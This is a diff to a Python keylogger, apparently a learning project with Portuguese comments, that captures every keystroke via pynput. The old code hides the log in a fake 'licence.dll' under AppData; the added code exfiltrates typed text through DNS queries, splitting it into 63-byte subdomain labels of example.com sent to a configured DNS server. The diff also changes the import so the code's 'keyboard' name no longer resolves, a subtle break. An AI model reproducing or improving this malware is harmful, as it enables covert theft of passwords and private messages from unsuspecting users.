@@ -3,14 +3,19 @@
 ###############################################################
 import os
 import time
+import socket
 import threading
-from pynput import keyboard
+import pynput.keyboard
+from dnslib import DNSRecord, RR, A
 
 ###############################################################
 # Vars. Global
 ###############################################################
-_PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
-_NAME = 'licence.dll'
+# Ofuscação no Windows
+# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
+# _NAME = 'licence.dll'
+_DNS_ADDR = ('127.0.0.1', 9953)
+_PATH = None
 _KEYS = ''
 _AUTO_SAVE_TIME = 10
 _RUN = True
@@ -46,8 +51,13 @@ def auto_save():
     global _RUN
 
     while _RUN:
-        if len(_KEYS) > 0:
-            write_on_file(_KEYS)
+        if _PATH:
+            if len(_KEYS) > 0:
+                write_on_file(_KEYS)
+        else:
+            # Chamar a função para enviar via DNS
+            pass
+        
         time.sleep(_AUTO_SAVE_TIME)
 
 def write_on_file(c):
@@ -77,6 +87,43 @@ def del_on_file():
         file.close()
 '''
 
+def send_data(data):
+    '''
+    Recebe os dados e os envia usando requisições DNS
+    de 63 em 63 bytes.
+
+    Parameters:
+        data (str): Data que iremos enviar
+    
+    Returns:
+        None    
+    '''
+    global _DNS_ADDR
+
+    # Divide os dados em partes menores para serem válidos
+    # como nomes de domínio máximo de 63bytes por hostname
+    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)]
+    
+    while len(parts) > 0:
+        # Cria um nome de domínio fictício
+        domain = parts.pop(0) + '.example.com'
+        
+        # Cria a requisição DNS
+        q = DNSRecord.question(domain)
+        
+        # Envia a requisição DNS para o servidor
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(5.0)
+        sock.sendto(q.pack(), _DNS_ADDR)
+
+        # Recebendo resposta falsa do DNS
+        try:
+            _ = sock.recvfrom(512)
+        except socket.timeout:
+            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
+            
+        sock.close()
+
 def p_numbers(n):
     """
     Recebe o número no formato do Pynput
@@ -104,10 +151,14 @@ def on_press(key):
         _RUN = False
         return False
 
-    # Se apertar enter ele grava o que está digitado
+    # Se apertar enter ele grava/envia o que está digitado
     elif key == keyboard.Key.enter:
         _KEYS += ' \n'
-        write_on_file(_KEYS)
+        if _PATH:
+            write_on_file(_KEYS)
+        else:
+            send_data(_KEYS)
+            _KEYS = ''
 
     # Adicionando espaço do TAB
     elif key == keyboard.Key.tab:
@@ -142,13 +193,14 @@ def on_press(key):
 # Main
 ###############################################################
 if __name__ == "__main__":
-
     # Verifica se o caminho para gravar existe
+    '''
     if os.path.isdir(_PATH):
         _PATH = os.path.join(_PATH, _NAME)
     else:
         os.mkdir(_PATH)
         _PATH = os.path.join(_PATH, _NAME)
+    '''
 
     # Cria um listener para capturar os eventos de teclado
     listener = keyboard.Listener(on_press=on_press)
